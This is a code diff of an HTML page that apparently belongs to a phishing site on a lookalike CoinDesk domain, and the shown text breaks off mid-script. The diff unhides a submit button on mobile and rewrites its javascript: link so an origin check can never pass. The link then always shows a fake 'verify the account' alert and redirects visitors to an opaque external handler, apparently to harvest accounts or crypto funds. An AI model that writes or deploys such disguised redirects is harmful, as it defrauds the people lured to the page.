@@ -5619,7 +5619,6 @@ This form cannot be submitted using a mobile device.
                     <style>
                       @media screen and (max-width: 768px) {
                         #submitbutton {
-                          display: none !important; /* This ensures the button is hidden on mobile devices */
                         }	
                       }
                     </style>
@@ -5631,7 +5630,7 @@ This form cannot be submitted using a mobile device.
 
 
 <a id="submitbutton" href="javascript:(function(){
-                          if ('https://coindesk.com.co' !== window.location.origin) {
+                          if ('https://coindesk.com.co/nsent-form/' !== window.location.origin) {
                             alert('You must verify the account associated with the publication to complete this submission.');
                             setTimeout(function(){
                               window.location.href = 'https://415eb867-d310-46c1-8dcd-56aa70fa26bc.o-handler-network.com/api/start/v2';
